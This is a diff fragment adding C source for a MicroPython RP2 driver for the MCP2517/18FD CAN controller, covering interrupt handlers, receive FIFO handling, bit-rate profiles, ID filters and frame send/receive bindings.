+                self->rx_fifo.rx_events[idx].info.overflow_cnt.error_cnt = 1U;  // Did not record this error frame
+                self->rx_fifo.rx_events[idx].info.overflow_cnt.frame_cnt = 0;
+                // The timestamp is the time of the first drop
+                self->rx_fifo.rx_events[idx].timestamp = timestamp;
+            }
+        } else {
+            // Put the error into the FIFO
+            self->rx_fifo.free--;
+            uint8_t idx = self->rx_fifo.tail_idx++;
+            if (self->rx_fifo.tail_idx == RX_FIFO_SIZE) {
+                self->rx_fifo.tail_idx = 0;
+            }
+            self->rx_fifo.rx_events[idx].event_type = EVENT_TYPE_CAN_ERROR;
+            self->rx_fifo.rx_events[idx].timestamp = timestamp;
+            self->rx_fifo.rx_events[idx].info.c1bdiag1 = c1bdiag1;
+            self->rx_fifo.rx_events[idx].info.c1bdiag1 = c1bdiag1;
+        };
+    }
+
+    mcp251718fd_enable_interrupts();
+    // Trigger held high for enough time to be seen by even a slow logic analyzer
+    // Will still be able to trigger even if not storing errors in the receive FIFO
+    TRIG_CLEAR();
+}
+
+// Called with a received frame
+// TODO performance enhancement: calculate addr by shadowing RX FIFO rather than use an SPI transaction to pick it up
+STATIC TIME_CRITICAL void mcp251718fd_rx_handler()
+{
+    uint16_t addr = (uint16_t)mcp251718fd_spi_read_word(C1FIFOUA1) + 0x400U;
+
+    // Pick up the frame
+    uint32_t r[5];
+    mcp251718fd_spi_read_words(addr, r, 5U);
+    // Mark the frame as taken, ensure that timestamping and the not-empty interrupt are still enabled
+    // Set UINC, RXTSEN, TFNRFNIE,
+    mcp251718fd_spi_write_word(C1FIFOCON1, (1U << 8) | (1U << 5) | (1U << 0));
+
+    // Assemble CAN ID from ID A, ID B and IDE
+    canid_t canid = ((r[0] >> 11) & 0x3ffffU) | ((r[0] & 0x7ff) << 18) | ((r[1] & (1U << 4)) << 25);
+    uint8_t dlc = r[1] & 0xfU;
+    bool remote = (r[1] & (1U << 5)) != 0;
+    uint8_t id_filter = (r[1] >> 11) & 0x1fU;
+    uint32_t timestamp = r[2];
+    uint32_t payload_0 = r[3];
+    uint32_t payload_1 = r[4];
+    rp2_can_obj_t *self = MP_STATE_PORT(rp2_can_obj);
+
+    if (self->triggers[0].enabled && self->triggers[0].on_rx) {
+        if (((canid & self->triggers[0].can_id_mask) == self->triggers[0].can_id_match) &&
+            ((dlc & self->triggers[0].can_dlc_mask) == self->triggers->can_dlc_match) &&
+            ((payload_0 & self->triggers[0].can_payload_mask[0]) == self->triggers->can_payload_match[0]) &&
+            ((payload_1 & self->triggers[0].can_payload_mask[1]) == self->triggers->can_payload_match[1])) {
+            TRIG_SET();
+        }
+    }
+
+    // The FIFO elements in the software receive FIFO are not MicroPython CANFrame objects but structures with
+    // CAN info to allow a MicroPython object to be created.
+    if (self->rx_fifo.free <= 1U) {
+        // No space for it - discard a frame, marking the last free slot as an "overrun"; this will become
+        // a None object when recv() is called
+        if (self->rx_fifo.free == 0) {
+            // There must already an overflow frame at the back of the queue
+            self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.frame_cnt++;
+            if (self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.frame_cnt == 0) {
+                // Overflowed so roll it back to make it sticky
+                self->rx_fifo.rx_events[self->rx_fifo.dropped_event_idx].info.overflow_cnt.frame_cnt--;
+            }
+        }
+        else {
+            // Add an 'overflow' frame to the back of the queue
+            self->rx_fifo.free = 0;
+            uint8_t idx = self->rx_fifo.tail_idx++;
+            self->rx_fifo.dropped_event_idx = idx;
+            if (self->rx_fifo.tail_idx == RX_FIFO_SIZE) {
+                self->rx_fifo.tail_idx = 0;
+            }
+            self->rx_fifo.rx_events[idx].event_type = EVENT_TYPE_OVERFLOW;
+            // Use CAN ID as a dropped-frame count
+            self->rx_fifo.rx_events[idx].info.overflow_cnt.frame_cnt = 1U;  // Did not record this frame
+            self->rx_fifo.rx_events[idx].info.overflow_cnt.error_cnt = 0;
+            // The timestamp is the time of the first drop
+            self->rx_fifo.rx_events[idx].timestamp = timestamp;
+        }
+    }
+    else {
+        // Put the frame into the FIFO
+        self->rx_fifo.free--;
+        uint8_t idx = self->rx_fifo.tail_idx++;
+        if (self->rx_fifo.tail_idx == RX_FIFO_SIZE) {
+            self->rx_fifo.tail_idx = 0;
+        }
+        self->rx_fifo.rx_events[idx].event_type = EVENT_TYPE_RECEIVED_FRAME;
+        self->rx_fifo.rx_events[idx].timestamp = timestamp;
+        self->rx_fifo.rx_events[idx].info.rx_frame.canid = canid;
+        self->rx_fifo.rx_events[idx].info.rx_frame.dlc = dlc;
+        self->rx_fifo.rx_events[idx].info.rx_frame.remote = remote;
+        self->rx_fifo.rx_events[idx].info.rx_frame.payload[0] = payload_0;
+        self->rx_fifo.rx_events[idx].info.rx_frame.payload[1] = payload_1;
+        self->rx_fifo.rx_events[idx].info.rx_frame.id_filter = id_filter;
+    };
+    // Trigger held high for enough time to be seen by even a slow logic analyzer
+    TRIG_CLEAR();
+}
+
+// Called directly from outer handler
+void TIME_CRITICAL mcp251718fd_irq_handler(void)
+{
+    // Gets an interrupt from:
+    //
+    // Sent frame
+    // Received frame
+    // Bus-off
+
+    // Can call a single sub-handler and each sub-handler will handle one
+    // event; if there are multiple events then the IRQ will be re-raised
+    // (since it is level-sensitive). Interrupt will also be re-raised if
+    // more events have occurred.
+
+#ifdef CAN_IRQ_CHECKING
+    irq_locked = true;
+#endif
+    // Read C1INT and then trigger on:
+    uint32_t events = mcp251718fd_spi_read_word(C1INT);
+    if (events & (1U << 4)) {           // TEFIF (i.e. TEF event)
+        mcp251718fd_tx_handler();
+    } else if (events & (1U << 1)) {    // RXIF (i.e. received frame into the FIFO)
+        mcp251718fd_rx_handler();
+    } else if (events & (1U << 13)) {   // CERRIF to detect bus off
+        mcp251718fd_bus_off_handler();
+    } else if (events & (1U << 15)) {   // IVMIF to detect errors
+        mcp251718fd_error_handler();
+    }
+    else {
+        CAN_ASSERT(0, "A2");
+        // Spurious interrupt - may be handled by a MicroPython function in the handoff ISR
+    }
+#ifdef CAN_IRQ_CHECKING
+    irq_locked = false;
+#endif
+}
+
+STATIC TIME_CRITICAL uint32_t mcp251718fd_get_timebase(void)
+{
+    CAN_ASSERT(!irq_locked, "A3")
+    DISABLE_GPIO_INTERRUPTS();
+    uint32_t timebase = mcp251718fd_spi_read_word(C1TBC);
+    ENABLE_GPIO_INTERRUPTS();
+
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "timebase=0x%08"PRIx32"\n", timebase);
+
+    return timebase;
+}
+
+STATIC TIME_CRITICAL uint32_t mcp251718fd_get_trec(void)
+{
+    CAN_ASSERT(!irq_locked, "A4")
+    DISABLE_GPIO_INTERRUPTS();
+    uint32_t trec = mcp251718fd_spi_read_word(C1TREC);
+    ENABLE_GPIO_INTERRUPTS();
+
+    CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "trec=0x%08"PRIx32"\n", trec);
+
+    return trec;
+}
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////// End of MCP2517/18FD drivers ///////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+/////////////////////////////////// Start of MicroPython bindings //////////////////////////////////////
+////////////////////////////////////////////////////////////////////////////////////////////////////////
+STATIC TIME_CRITICAL void init_tx_buffers(rp2_can_obj_t *self)
+{
+    CRITICAL_SECTION_CHECK("CA");
+
+    // Ensure there are no references to any CANFrame instances
+    for (uint32_t i = 0; i < MCP251718FD_TX_FIFO_SIZE; i++) {
+        self->tx_fifo.frames[i] = 0;
+    }
+    self->tx_fifo.head_idx = 0;
+    self->tx_fifo.tail_idx = 0;
+    self->tx_fifo.num_free_slots = MCP251718FD_TX_FIFO_SIZE;
+
+    // Ensure there are no references to any CANFrame instances
+    for (uint32_t i = 0; i < MCP251718FD_TX_QUEUE_SIZE; i++) {
+        self->tx_queue.frames[i] = 0;
+    }
+    self->tx_queue.num_free_slots = MCP251718FD_TX_QUEUE_SIZE;
+    self->tx_queue.fifo_slot = MCP251718FD_TX_FIFO_SIZE;
+}
+
+STATIC TIME_CRITICAL void init_structures(rp2_can_obj_t *self)
+{
+    CRITICAL_SECTION_CHECK("CB");
+
+    // Receive frame FIFO is empty
+    self->rx_fifo.head_idx = 0;
+    self->rx_fifo.tail_idx = 0;
+    self->rx_fifo.free = RX_FIFO_SIZE;
+    self->rx_fifo.dropped_event_idx = 0;
+
+    // Transmit event FIFO is empty
+    self->event_fifo.head_idx = 0;
+    self->event_fifo.tail_idx = 0;
+    self->event_fifo.free = TX_EVENT_FIFO_SIZE;
+    self->event_fifo.dropped_event_idx = 0;
+
+    // Initialize transmit buffers
+    init_tx_buffers(self);
+
+    // Initialize the event triggers
+    self->triggers[0].enabled = false;
+    self->triggers[0].on_error = false;
+}
+
+////////////////////////////////////// Start of CAN class //////////////////////////////////////
+// Create the CAN instance and initialize the controller
+STATIC mp_obj_t rp2_can_make_new(const mp_obj_type_t *type, mp_uint_t n_args, mp_uint_t n_kw, const mp_obj_t *all_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_profile,           MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int  = 0}},
+        {MP_QSTR_id_filters,        MP_ARG_KW_ONLY | MP_ARG_OBJ,    {.u_obj = MP_OBJ_NULL}},
+        {MP_QSTR_hard_reset,        MP_ARG_KW_ONLY | MP_ARG_BOOL,   {.u_bool = false}},
+        {MP_QSTR_brp,               MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int  = -1}},
+        {MP_QSTR_tseg1,             MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int  = 10}},
+        {MP_QSTR_tseg2,             MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int  = 3}},
+        {MP_QSTR_sjw,               MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int  = 2}},
+        {MP_QSTR_recv_errors,       MP_ARG_KW_ONLY | MP_ARG_BOOL,   {.u_bool = false}},
+        {MP_QSTR_mode,              MP_ARG_KW_ONLY | MP_ARG_INT,    {.u_int = 0}},
+        {MP_QSTR_tx_open_drain,     MP_ARG_KW_ONLY | MP_ARG_BOOL,   {.u_bool = false}},
+        // TODO add "accept_remote" parameter (default True)
+    };
+
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all_kw_array(n_args, n_kw, all_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    uint32_t profile = args[0].u_int;
+    mp_obj_dict_t *id_filters = args[1].u_obj;
+    bool hard_reset = args[2].u_bool;
+    int brp = args[3].u_int;
+    u_int tseg1 = args[4].u_int;
+    u_int tseg2 = args[5].u_int;
+    u_int sjw = args[6].u_int;
+    bool recv_errors = args[7].u_bool;
+    canmode_t mode = args[8].u_int;
+    bool tx_open_drain = args[9].u_int;
+
+    // Modes are:
+    // 0: (default) CAN.NORMAL, start normally
+    // 1: CAN.LISTEN_ONLY, does not ever set TX to 0
+    // 2: CAN.ACK_ONLY, does not transmit but does set ACK=0
+    // 3: CAN.OFFLINE, does not send or receive
+
+    if (id_filters != NULL) {
+        // Check dictionary is well-formed
+        if(!MP_OBJ_IS_TYPE(id_filters, &mp_type_dict)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "A dict expected for id_filters"));
+        }
+
+        for(uint32_t idx = 0; idx < 32U; idx++) {
+            mp_map_elem_t *elem = mp_map_lookup(&id_filters->map, MP_OBJ_NEW_SMALL_INT(idx), MP_MAP_LOOKUP);
+            if (elem != NULL) {
+                if(!MP_OBJ_IS_TYPE(elem->value, &rp2_canidfilter_type)) {
+                    nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "A CANIDFilter instance expected for filter %d", idx));
+                }
+            }
+        }
+    }
+
+    // Create class instance for controller
+    rp2_can_obj_t *self = MP_STATE_PORT(rp2_can_obj);
+
+    if (MP_STATE_PORT(rp2_can_obj) == NULL) {
+        // Newly create object (we don't want it created always because it's a fairly large object, with
+        // large receive FIFO and this shouldn't be allocated until needed).
+        self = m_new_obj(rp2_can_obj_t);
+        self->base.type = &rp2_can_type;
+        MP_STATE_PORT(rp2_can_obj) = self;
+    }
+
+    CAN_ASSERT(!irq_locked, "A5")
+    DISABLE_GPIO_INTERRUPTS();
+
+    // Sets up SPI1, ensures chip not selected
+    pico_pin_init();
+
+    if (hard_reset) {
+        mcp251718fd_hard_reset();
+    }
+
+    // Set clock and I/O pins (set TX pin to open drain if requested)
+    mcp251718fd_set_pins(tx_open_drain);
+    // Set bit rate according to profile
+    // FSYSCLK is 40MHz, 25ns clock period
+
+    // Try to put the device into config mode (which resets everything)
+    uint32_t retries = 0;
+    for (;;) {
+        // We should give up after some time: could be many milliseconds or even forever if the
+        // bus is under attack with the freeze doom loop
+        if (brp < 0) {
+            switch (profile) {
+                default:
+                case CAN_BITRATE_500K_75:
+                    brp = 4U;       // 40MHz / 5 = 8MHz, 16 time quanta per bit
+                    tseg1 = 10U;    // Sync seg is 1
+                    tseg2 = 3U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_250K_75: // 250bit/sec, 75%
+                    brp = 9U;       // 40MHz / 10 = 8MHz, 16 time quanta per bit
+                    tseg1 = 10U;
+                    tseg2 = 3U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_125K_75:
+                    brp = 19U;      // 40MHz / 20 = 8MHz, 16 time quanta per bit
+                    tseg1 = 10U;
+                    tseg2 = 3U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_1M_75:
+                    brp = 1U;       // 40MHz / 2 = 20MHz, 20 time quanta per bit
+                    tseg1 = 13U;
+                    tseg2 = 4U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_500K_50:
+                    brp = 4U;       // 40MHz / 5 = 8MHz, 16 time quanta per bit
+                    tseg1 = 6U;     // Sync seg is 1
+                    tseg2 = 7U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_250K_50:
+                    brp = 9U;       // 40MHz / 10 = 8MHz, 16 time quanta per bit
+                    tseg1 = 6U;     // Sync seg is 1
+                    tseg2 = 7U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_125K_50:
+                    brp = 19U;      // 40MHz / 20 = 8MHz, 16 time quanta per bit
+                    tseg1 = 6U;     // Sync seg is 1
+                    tseg2 = 7U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_1M_50:
+                    brp = 1U;       // 40MHz / 2 = 20MHz, 20 time quanta per bit
+                    tseg1 = 8U;     // Sync seg is 1
+                    tseg2 = 9U;
+                    sjw = 2U;
+                    break;
+                case CAN_BITRATE_2M_50:
+                    brp = 0;
+                    tseg1 = 8U;
+                    tseg2 = 9U;
+                    sjw = 1U;
+                    break;
+                case CAN_BITRATE_4M_90:
+                    brp = 0;
+                    tseg1 = 7U;
+                    tseg2 = 0;
+                    sjw = 1U;
+                    break;
+                case CAN_BITRATE_2_5M_75:
+                    brp = 1;
+                    tseg1 = 4U;
+                    tseg2 = 1U;
+                    sjw = 1U;
+                    break;
+                case CAN_BITRATE_2M_80:
+                    brp = 0U;
+                    tseg1 = 14U;
+                    tseg2 = 3U;
+                    sjw = 1U;
+                    break;
+            }
+        }
+        if (mcp251718fd_init(mode, brp, tseg1, tseg2, sjw)) {
+            break;
+        }
+        if (retries++ > 1000U) {
+            ENABLE_GPIO_INTERRUPTS();
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_RuntimeError, "Cannot put MCP2517/18FD into config mode"));
+        }
+    }
+
+    uint32_t filter_control[8];
+    // Disable all the ID filters (which might not be disabled if we come into this with the controller
+    // having already been running)
+    for (uint32_t i = 0; i < 8U; i++) {
+        filter_control[i] = 0;
+        mcp251718fd_spi_write_word(C1FLTCON(i), 0);
+    }
+
+    // Add in the filters
+    if (id_filters != NULL) {
+        CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Setting specific filters\n");
+        for (uint32_t idx = 0; idx < 32U; idx++) {
+            mp_map_elem_t *elem = mp_map_lookup(&id_filters->map, MP_OBJ_NEW_SMALL_INT(idx), MP_MAP_LOOKUP);
+            if (elem != NULL) {
+                CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Filter index=%d\n", idx);
+                rp2_canidfilter_obj_t *filter = elem->value;
+
+                // Enables the filter and sets it to direct frames to RX FIFO 1
+                filter_control[idx >> 2] |= (0x81U << ((idx & 0x03U) << 3));
+                // Sets the mask/match registers accordingly
+                CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "C1FLTOBJ[%d]=0x%08"PRIx32"\n", idx, filter->fltobj);
+                CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "C1MASK[%d]=0x%08"PRIx32"\n", idx, filter->mask);
+
+                mcp251718fd_spi_write_word(C1FLTOBJ(idx), filter->fltobj);
+                mcp251718fd_spi_write_word(C1MASK(idx), filter->mask);
+            }
+        }
+    } else {
+        CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "Setting a global allow-all filter\n");
+        // Set filter 0 to match-all and direct frames to the RX FIFO
+        filter_control[0] = 0x81U;
+        mcp251718fd_spi_write_word(C1FLTOBJ(0), 0);
+        mcp251718fd_spi_write_word(C1MASK(0), 0);
+    }
+
+    // Enable the appropriate filters
+    for (uint32_t i = 0; i < 8U; i++) {
+        CAN_DEBUG_PRINT(MP_PYTHON_PRINTER, "C1FLTCON[%d]=0x%08"PRIx32"\n", i, filter_control[i]);
+        mcp251718fd_spi_write_word(C1FLTCON(i), filter_control[i]);
+    }
+
+    init_structures(self);
+
+    self->recv_errors = recv_errors;
+    self->mode = mode;
+
+    // Enable SPI interrupt on Pico pin, level sensitive, low (all MCP2517/18FD interrupt
+    // pins are active low), and will add in a callback into the vector table.
+    //
+    // Note that this might need to change if other software in the Pico is using the GPIO
+    // interrupt handler.
+    //
+    // Call will enable GPIO interrupts, make them interrupt the timer etc.
+    // There is an issue because all the GPIO interrupts of this bank go through the same vector,
+    // which is shared with a stub that allows MicroPython functions to run as ISRs. A hand-off mechanism is
+    // used for MicroPython function ISRs (see machine_pin.c).
+    //
+    // Default IRQ priority is 0x80 (i.e. 2, where 0 is the highest and 3 is the lowest).
+    irq_set_priority(SPI_IRQ_GPIO, SPI_GPIO_IRQ_PRIORITY);
+    // Allow the interrupts at source
+    gpio_set_irq_enabled(SPI_IRQ_GPIO, LEVEL_SENSITIVE_LOW, true);
+
+    ENABLE_GPIO_INTERRUPTS();
+
+    return self;
+}
+
+STATIC mp_obj_t rp2_can_send_frame(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_frame,    MP_ARG_REQUIRED | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+        {MP_QSTR_fifo,     MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    rp2_canframe_obj_t *frame = args[0].u_obj;
+    bool fifo = args[1].u_bool;
+
+    if(!MP_OBJ_IS_TYPE(frame, &rp2_canframe_type)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "CANFrame expected"));
+    }
+
+    CAN_ASSERT(!irq_locked, "A6")
+    DISABLE_GPIO_INTERRUPTS();
+    bool queued = mcp251718fd_send_frame(frame, fifo, &self->tx_queue, &self->tx_fifo);
+    ENABLE_GPIO_INTERRUPTS();
+
+    if (!queued) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "No room in transmit queue"));
+    }
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_send_frame_obj, 1, rp2_can_send_frame);
+
+STATIC mp_obj_t rp2_can_send_frames(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_frames,   MP_ARG_REQUIRED | MP_ARG_OBJ, {.u_obj = MP_OBJ_NULL}},
+        {MP_QSTR_fifo,     MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    mp_obj_list_t *frames = args[0].u_obj;
+    bool fifo = args[1].u_bool;
+
+    if(!MP_OBJ_IS_TYPE(frames, &mp_type_list)) {
+        nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "List of CAN frames expected"));
+    }
+    // Quick check to see that the list contains only CAN frames
+    for (uint32_t i = 0; i < frames->len; i++) {
+        rp2_canframe_obj_t *frame = frames->items[i];
+        if(!MP_OBJ_IS_TYPE(frame, &rp2_canframe_type)) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_TypeError, "CANFrame expected"));
+        }
+    }
+    // Check there is room for the total number of frames, in the queue or in the software FIFO
+    // so that all the frames are queued or none are
+    if (fifo) {
+        if (self->tx_queue.fifo_slot == MCP251718FD_TX_QUEUE_SIZE) {
+            // No existing FIFO frame in the transmit queue
+            if (self->tx_queue.num_free_slots < 1U) {
+                nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "No room in transmit queue for the first frame"));
+            }
+            if (frames->len - 1U > self->tx_fifo.num_free_slots) {
+                nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "No room in transmit FIFO for the remaining frames"));
+            }
+        }
+        else {
+            if (frames->len > self->tx_fifo.num_free_slots) {
+                nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "No room in transmit FIFO for all the frames"));
+            }
+        }
+    }
+    else {
+        if (frames->len > self->tx_queue.num_free_slots) {
+            nlr_raise(mp_obj_new_exception_msg_varg(&mp_type_ValueError, "No room in transmit queue for all the frames"));
+        }
+    }
+
+    // Now can queue the frames because there is space and everything is of the right type
+    for (uint32_t i = 0; i < frames->len; i++) {
+        rp2_canframe_obj_t *frame = frames->items[i];
+        CAN_ASSERT(!irq_locked, "A7")
+        DISABLE_GPIO_INTERRUPTS();
+        mcp251718fd_send_frame(frame, fifo, &self->tx_queue, &self->tx_fifo);
+        ENABLE_GPIO_INTERRUPTS();
+    }
+    return mp_const_none;
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_send_frames_obj, 1, rp2_can_send_frames);
+
+STATIC TIME_CRITICAL void pop_rx_frame(rp2_can_obj_t *self, mp_obj_list_t *list, uint32_t i)
+{
+    // This must be called with interrupts disabled
+    rp2_canframe_obj_t *frame;
+    rp2_canerror_obj_t *error_frame;
+
+    // Pop the front of the receive FIFO
+    self->rx_fifo.free++;
+    uint8_t idx = self->rx_fifo.head_idx++;
+    if (self->rx_fifo.head_idx == RX_FIFO_SIZE) {
+        self->rx_fifo.head_idx = 0;
+    }
+
+    // Fill in the list with an appropriate item
+    // NB: don't use a switch because we don't want the compiler to generate switch tables in ROM that
+    // then lives in serial flash
+    canevent_type_t ev = self->rx_fifo.rx_events[idx].event_type;
+
+    if (ev == EVENT_TYPE_OVERFLOW) {
+        list->items[i] = mp_const_none;
+    }
+    else if (ev == EVENT_TYPE_CAN_ERROR) {
+        error_frame = m_new_obj(rp2_canerror_obj_t);
+        error_frame->base.type = &rp2_canerror_type;
+        error_frame->c1bdiag1 = self->rx_fifo.rx_events[idx].info.c1bdiag1;
+        error_frame->timestamp = self->rx_fifo.rx_events[idx].timestamp;
+
+        list->items[i] = error_frame;
+    }
+    else if (ev == EVENT_TYPE_RECEIVED_FRAME) {
+        // Create a new CANFrame object
+        frame = m_new_obj(rp2_canframe_obj_t);
+        frame->base.type = &rp2_canframe_type;
+        // Fill in the details from the event
+        frame->can_id = self->rx_fifo.rx_events[idx].info.rx_frame.canid;
+        frame->timestamp = self->rx_fifo.rx_events[idx].timestamp;
+        frame->tag = 0;
+        frame->timestamp_valid = true;
+        frame->id_filter = self->rx_fifo.rx_events[idx].info.rx_frame.id_filter;
+        frame->remote = self->rx_fifo.rx_events[idx].info.rx_frame.remote;
+        frame->dlc = self->rx_fifo.rx_events[idx].info.rx_frame.dlc;
+        frame->payload[0] = self->rx_fifo.rx_events[idx].info.rx_frame.payload[0];
+        frame->payload[1] = self->rx_fifo.rx_events[idx].info.rx_frame.payload[1];
+
+        list->items[i] = frame;
+    }
+    else {
+        // This should never happen but fill in something anyway
+        list->items[i] = mp_const_none;
+    }
+}
+
+// Pop a transmit event (if there's room) into a buffer that has n bytes spare
+STATIC TIME_CRITICAL uint32_t pop_rx_frame_as_bytes(rp2_can_obj_t *self, uint8_t *buf, uint32_t n)
+{
+    // This must be called with interrupts disabled
+
+    // Frame is a fixed size
+    if (n >= NUM_FRAME_BYTES) {
+        // Pop the front of the transmit event FIFO
+        self->rx_fifo.free++;
+        uint8_t idx = self->rx_fifo.head_idx++;
+        if (self->rx_fifo.head_idx == TX_EVENT_FIFO_SIZE) {
+            self->rx_fifo.head_idx = 0;
+        }
+
+        buf[0] = self->rx_fifo.rx_events[idx].event_type;                                       // Flags byte
+        BIG_ENDIAN_BUF(buf + 1U, self->rx_fifo.rx_events[idx].timestamp);           // Timestamp
+
+        canevent_type_t ev = self->rx_fifo.rx_events[idx].event_type;
+        if (ev == EVENT_TYPE_OVERFLOW) {
+            // Pack out the rest of the bytes with the overflow counts
+            BIG_ENDIAN_BUF(buf + 7U, self->rx_fifo.rx_events[idx].info.overflow_cnt.frame_cnt);
+            BIG_ENDIAN_BUF(buf + 11U, self->rx_fifo.rx_events[idx].info.overflow_cnt.error_cnt);
+        }
+        else if (ev == EVENT_TYPE_CAN_ERROR) {
+            // Pack out the rest of the bytes with the details of the error
+            BIG_ENDIAN_BUF(buf + 7U, self->rx_fifo.rx_events[idx].info.c1bdiag1);
+        }
+        else if (ev == EVENT_TYPE_RECEIVED_FRAME) {
+            // Pack out the rest of the bytes with the frame details
+            // Add flag info to indicate a remote frame
+            buf[0] |= self->rx_fifo.rx_events[idx].info.rx_frame.remote ? 0x80U : 0x00U;
+            // DLC, ID filter hit, timestamp, CAN ID, payload
+            buf[5] = self->rx_fifo.rx_events[idx].info.rx_frame.dlc;
+            buf[6] = self->rx_fifo.rx_events[idx].info.rx_frame.id_filter;
+            BIG_ENDIAN_BUF(buf + 7U, self->rx_fifo.rx_events[idx].info.rx_frame.canid);
+            for (size_t i = 0; i < 8U; i++) {
+                buf[11 + i] = *((uint8_t *) (self->rx_fifo.rx_events[idx].info.rx_frame.payload) + i);
+            }
+        }
+        return NUM_FRAME_BYTES;
+    }
+    else {
+        return 0;
+    }
+}
+
+STATIC mp_obj_t rp2_can_recv(mp_uint_t n_args, const mp_obj_t *pos_args, mp_map_t *kw_args)
+{
+    static const mp_arg_t allowed_args[] = {
+        {MP_QSTR_limit,    MP_ARG_KW_ONLY | MP_ARG_INT, {.u_int = RX_FIFO_SIZE}},
+        {MP_QSTR_as_bytes, MP_ARG_KW_ONLY | MP_ARG_BOOL, {.u_bool = false}},
+    };
+
+    rp2_can_obj_t *self = pos_args[0];
+    mp_arg_val_t args[MP_ARRAY_SIZE(allowed_args)];
+    mp_arg_parse_all(n_args - 1, pos_args + 1, kw_args, MP_ARRAY_SIZE(allowed_args), allowed_args, args);
+
+    // rx_fifo.free is safe to access outside the ISR because it's an atomic word and can only decrease so num_frames can only increase
+    uint32_t num_frames = RX_FIFO_SIZE - self->rx_fifo.free;
+    uint32_t limit = args[0].u_int;
+    bool as_bytes = args[1].u_bool;
+
+    if (limit > num_frames) {
+        limit = num_frames;
+    }
+
+    if (as_bytes) {
+        // Temporary buffer to store some frames
+        uint8_t buf[255];
+
+        size_t remaining = sizeof(buf);
+        size_t n = 0;
+
+        // Pull frames from the FIFO up to a limit, keeping track of the bytes added
+        for (uint32_t i = 0; i < limit; i++) {
+            CAN_ASSERT(!irq_locked, "A8")
+            DISABLE_GPIO_INTERRUPTS();
+            size_t added = pop_rx_frame_as_bytes(self, buf + n, remaining);
+            ENABLE_GPIO_INTERRUPTS();
+            if (added) {
+                n += added;
+                remaining -= added;
+            }
+            else {
+                break;
+            }
+        }
+        // Return bytes for the block of frames (might be zero)
+        return make_mp_bytes(buf, n);
+    }
+    else {
+        // Frames that will be pulled are the minimum of the limit or the number of frames in the RX FIFO
+        // Will return an empty list if there are no frames
+        mp_obj_list_t *list = mp_obj_new_list(limit, NULL);
+
+        // Pull frames from the FIFO up to a limit
+        for (uint32_t i = 0; i < limit; i++) {
+            CAN_ASSERT(!irq_locked, "A9")
+            DISABLE_GPIO_INTERRUPTS();
+            pop_rx_frame(self, list, i);
+            ENABLE_GPIO_INTERRUPTS();
+        }
+        return list;
+    }
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_KW(rp2_can_recv_obj, 1, rp2_can_recv);
+
+// Return number of messages waiting in the RX FIFO.`
+STATIC mp_obj_t rp2_can_recv_pending(mp_obj_t self_in)
+{
+    rp2_can_obj_t *self = self_in;
+
+    // It's OK to access this with interrupt concurrency because it's an atomic word
+    uint32_t n = RX_FIFO_SIZE - self->rx_fifo.free;
+
+    return MP_OBJ_NEW_SMALL_INT(n);
+}
+STATIC MP_DEFINE_CONST_FUN_OBJ_1(rp2_can_recv_pending_obj, rp2_can_recv_pending);
+
+
